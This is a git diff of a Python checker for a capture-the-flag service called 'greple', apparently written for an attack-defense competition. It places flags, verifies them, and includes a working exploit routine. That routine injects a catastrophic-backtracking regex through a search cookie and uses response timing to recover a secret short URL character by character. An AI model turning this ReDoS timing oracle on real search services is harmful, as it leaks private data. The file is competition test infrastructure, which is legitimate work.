@@ -1,6 +1,9 @@
 """Checker for greple service."""
 
+import asyncio
+import hashlib
 import json
+import logging
 import math
 import pathlib
 import random
@@ -29,16 +32,15 @@ with (pathlib.Path.cwd() / "words.json").open() as f:
 
 _ENTROPY = 64
 
-_FLAG_URL_PREFIX = "http://example.com/"
-
 _REGEX_ESCAPE = {ord(c): rf"\{c}" for c in r"^$.*?+{|()\["}
 
-# TODO: add url prefix
-_SHORT_URL_PREFIX = ""
+_FLAG_URL_IP = "1.1.1.1"
+_FLAG_URL_PORT = 80
+
+_SHORT_URL_PREFIX = "/u/"
 _SHORT_URL_ALPHABET = string.digits + string.ascii_lowercase[: 16 - len(string.digits)]
 _SHORT_URL_LENGTH = math.ceil(_ENTROPY / math.log2(len(_SHORT_URL_ALPHABET)))
 _SHORT_URL_REGEX = (
-    r"\b"
     f"{_SHORT_URL_PREFIX.translate(_REGEX_ESCAPE)}"
     f"[{_SHORT_URL_ALPHABET.translate(_REGEX_ESCAPE)}]"
     f"{{{_SHORT_URL_LENGTH}}}"
@@ -50,75 +52,99 @@ def _cookieencode(query: dict[str, str]) -> str:
     return urlencode(query, quote_via=quote)
 
 
-def _noise(entropy: int, alphabet: Sequence[str], sep: str) -> str:
-    n = math.ceil(entropy / math.log2(len(alphabet)))
+def _noise(alphabet: Sequence[str], sep: str) -> str:
+    n = math.ceil(_ENTROPY / math.log2(len(alphabet)))
     return sep.join(random.choice(alphabet) for _ in range(n))
 
 
-def _alnum(entropy: int = _ENTROPY) -> str:
-    return _noise(entropy, string.ascii_letters + string.digits, "")
+def _lower() -> str:
+    return _noise(string.ascii_lowercase, "")
 
 
-def _words(entropy: int = _ENTROPY) -> str:
-    return _noise(entropy, _WORDS, " ")
+def _alnum() -> str:
+    return _noise(string.ascii_letters + string.digits, "")
 
 
-def _assert_re(regex: str, text: str) -> re.Match[str]:
-    m = re.search(regex, text)
-    if not m:
-        raise MumbleException(f"Regex {regex!r} not found in {text!r}")
-    return m
+def _words() -> str:
+    return _noise(_WORDS, " ")
 
 
-async def _register(client: httpx.AsyncClient, user: str) -> str:
+async def _register_user(client: httpx.AsyncClient, username: str) -> str:
     res = await client.get("/preferences")
     assert_equals(res.status_code, 200, "Unexpected HTTP status")
 
     res = await client.post(
         "/preferences",
-        data={"user": user, "password": _alnum(), "form_user_account": "Login"},
+        data={"username": username, "password": _alnum(), "form_user_account": "Login"},
     )
     assert_equals(res.status_code, 302, "Unexpected HTTP status")
     if res.next_request is None:
         raise MumbleException("No redirect")
     assert_in("user_account", res.cookies, "No user_account cookie")
     cookie = parse_qs(res.cookies["user_account"])
-    assert_in("user", cookie, "No user cookie")
-    assert_equals(cookie["user"], [user], "Unexpected user cookie")
-    assert_in("hmac", cookie, "No hmac cookie")
-    assert_equals(len(cookie["hmac"]), 1, "Unexpected hmac cookie")
+    assert_in("username", cookie, "No username in cookie")
+    assert_equals(cookie["username"], [username], "Unexpected username in cookie")
+    assert_in("hmac", cookie, "No hmac in cookie")
+    assert_equals(len(cookie["hmac"]), 1, "Unexpected hmac in cookie")
 
     res = await client.send(res.next_request)
     assert_equals(res.status_code, 200, "Unexpected HTTP status")
-    assert_in(f'value="{escape(user)}"', res.text, "Unexpected form value")
+    assert_in(f'value="{escape(username)}"', res.text, "Unexpected form value")
 
     return cookie["hmac"][0]
 
 
-async def _submit_page(
-    client: httpx.AsyncClient,
-    url: str,
-    title: str,
-    text: str,
-) -> None:
+async def _register_domain(client: httpx.AsyncClient, domain: str) -> None:
     res = await client.get("/console")
     assert_equals(res.status_code, 200, "Unexpected HTTP status")
 
     res = await client.post(
         "/console",
-        data={"url": url, "title": title, "text": text, "form_submit_page": "Submit"},
+        data={
+            "domain": domain,
+            "ip": _FLAG_URL_IP,
+            "port": _FLAG_URL_PORT,
+            "form_register_domain": "Register",
+        },
+    )
+    assert_equals(res.status_code, 302, "Unexpected HTTP status")
+    if res.next_request is None:
+        raise MumbleException("No redirect")
+
+    res = await client.send(res.next_request)
+    assert_equals(res.status_code, 200, "Unexpected HTTP status")
+    assert_in(escape(domain), res.text, "Unexpected table value")
+
+
+async def _submit_page(client: httpx.AsyncClient, domain: str, text: str) -> None:
+    res = await client.get("/console")
+    assert_equals(res.status_code, 200, "Unexpected HTTP status")
+
+    res = await client.post(
+        "/console",
+        data={
+            "domain": hashlib.sha224(domain.encode()).hexdigest(),
+            "path": f"/{_alnum()}.html",
+            "title": _words(),
+            "text": text,
+            "form_submit_page": "Submit",
+        },
     )
     assert_equals(res.status_code, 200, "Unexpected HTTP status")
     assert_in("page has been submitted", res.text, "Unexpected form value")
 
 
-async def _shorten_url(client: httpx.AsyncClient, url: str) -> str:
+async def _shorten_url(client: httpx.AsyncClient, domain: str, path: str) -> str:
     res = await client.get("/console")
     assert_equals(res.status_code, 200, "Unexpected HTTP status")
 
     res = await client.post(
         "/console",
-        data={"url": url, "form_shorten_url": "Shorten"},
+        data={
+            "domain": hashlib.sha224(domain.encode()).hexdigest(),
+            "path": path,
+            "form_shorten_url": "Shorten",
+        },
     )
     assert_equals(res.status_code, 200, "Unexpected HTTP status")
 
@@ -144,8 +170,7 @@ async def _search(client: httpx.AsyncClient, q: str) -> httpx.Response:
 
 
 async def _get_short_url(client: httpx.AsyncClient, short_url: str) -> str:
-    # TODO: remove prefix infavor of having prefix in url
-    res = await client.get(f"/u/{short_url}")
+    res = await client.get(short_url)
     assert_equals(res.status_code, 302, "Unexpected HTTP status")
     try:
         return res.headers["Location"]
@@ -154,47 +179,36 @@ async def _get_short_url(client: httpx.AsyncClient, short_url: str) -> str:
 
 
 @_CHECKER.putflag(0)
-async def _putflag(
-    task: PutflagCheckerTaskMessage,
-    client: httpx.AsyncClient,
-    db: ChainDB,
-) -> str:
-    user = _alnum()
-    hmac = await _register(client, user)
+async def _putflag(task: PutflagCheckerTaskMessage, client: httpx.AsyncClient, db: ChainDB) -> str:
+    username = _alnum()
+    hmac = await _register_user(client, username)
 
-    url = await _shorten_url(client, f"{_FLAG_URL_PREFIX}{quote(task.flag)}")
+    domain = f"{_lower()}.com"
+    await _register_domain(client, domain)
 
-    text = _words()
-    await _submit_page(
-        client,
-        f"{_FLAG_URL_PREFIX}{quote(_alnum())}",
-        _words(_ENTROPY // 2),
-        text + " " + url,
-    )
+    url = await _shorten_url(client, domain, f"/{quote(task.flag)}")
 
-    await db.set("user", user)
+    await _submit_page(client, domain, url)
+
+    await db.set("username", username)
     await db.set("hmac", hmac)
-    await db.set("text", text)
+    await db.set("domain", domain)
 
-    return text
+    return domain
 
 
 @_CHECKER.getflag(0)
-async def _getflag(
-    task: GetflagCheckerTaskMessage,
-    client: httpx.AsyncClient,
-    db: ChainDB,
-) -> None:
+async def _getflag(task: GetflagCheckerTaskMessage, client: httpx.AsyncClient, db: ChainDB) -> None:
     try:
-        user = await db.get("user")
+        username = await db.get("username")
         hmac = await db.get("hmac")
-        text = await db.get("text")
+        domain = await db.get("domain")
     except KeyError as e:
         raise MumbleException("Missing putflag data in DB") from e
 
-    client.cookies["user_account"] = _cookieencode({"user": user, "hmac": hmac})
+    client.cookies["user_account"] = _cookieencode({"username": username, "hmac": hmac})
 
-    res = await _search(client, text)
+    res = await _search(client, f"site:{domain}")
     short_url = re.search(_SHORT_URL_REGEX, res.text)
     if not short_url:
         raise MumbleException("Failed to find short URL")
@@ -203,12 +217,17 @@ async def _getflag(
     assert_in(quote(task.flag), url, "Flag missing")
 
 
-async def _test_for_regex_match(client: httpx.AsyncClient, q: str, regex: str) -> bool:
+async def _test_for_regex_match(
+    client: httpx.AsyncClient,
+    logger: logging.LoggerAdapter,
+    domain: str,
+    regex: str,
+) -> bool:
     n = 2**8
     redos = "(" * n + "." + ")*" * n
 
     res = await client.get(
-        "/search?" + urlencode({"q": q}),
+        "/search?" + urlencode({"q": f"site:{domain}"}),
         cookies={
             "safe_search": _cookieencode({"enabled": "on", "regex": redos + regex}),
         },
@@ -218,32 +237,32 @@ async def _test_for_regex_match(client: httpx.AsyncClient, q: str, regex: str) -
     t = re.search(r"\b[0-9]\.[0-9]{2}\b", res.text)
     if not t:
         raise MumbleException("Failed to find timing output")
-    return float(t[0]) < 0.1
+
+    logger.warning("search took %r seconds", float(t[0]))
+
+    return float(t[0]) < 0.034
 
 
-@_CHECKER.exploit(0)
-async def _exploit_sca(
-    task: ExploitCheckerTaskMessage,
+async def _exploit_sca_letter(
     client: httpx.AsyncClient,
-) -> str | None:
-    if task.attack_info is None:
-        raise MumbleException("Missing attack info")
+    logger: logging.LoggerAdapter,
+    sem: asyncio.Semaphore,
+    attack_info: str,
+    idx: int,
+) -> str:
+    lo = 0
+    hi = len(_SHORT_URL_ALPHABET) - 1
 
-    short_url = _SHORT_URL_PREFIX
-
-    for _ in range(_SHORT_URL_LENGTH):
-        lo = 0
-        hi = len(_SHORT_URL_ALPHABET) - 1
-
+    async with sem:
         while lo < hi:
             mid = (lo + hi) // 2
 
             if await _test_for_regex_match(
                 client,
-                task.attack_info,
-                task.attack_info.translate(_REGEX_ESCAPE)
-                + " "
-                + short_url.translate(_REGEX_ESCAPE)
+                logger,
+                attack_info,
+                _SHORT_URL_PREFIX.translate(_REGEX_ESCAPE)
+                + "." * idx
                 + "["
                 + _SHORT_URL_ALPHABET[lo : mid + 1].translate(_REGEX_ESCAPE)
                 + "]",
@@ -252,10 +271,24 @@ async def _exploit_sca(
             else:
                 lo = mid + 1
 
-        short_url += _SHORT_URL_ALPHABET[lo]
+    return _SHORT_URL_ALPHABET[lo]
+
+
+@_CHECKER.exploit(0)
+async def _exploit_sca(
+    task: ExploitCheckerTaskMessage,
+    client: httpx.AsyncClient,
+    logger: logging.LoggerAdapter,
+) -> str:
+    if task.attack_info is None:
+        raise MumbleException("Missing attack info")
+
+    sem = asyncio.Semaphore(2)
+    aws = (_exploit_sca_letter(client, logger, sem, task.attack_info, i) for i in range(_SHORT_URL_LENGTH))
+    short_url = _SHORT_URL_PREFIX + "".join(await asyncio.gather(*aws))
 
     url = await _get_short_url(client, short_url)
-    return unquote(url.removeprefix(_FLAG_URL_PREFIX))
+    return unquote(url.removeprefix(f"http://{_FLAG_URL_IP}:{_FLAG_URL_PORT}/"))
 
 
 def app() -> fastapi.FastAPI:
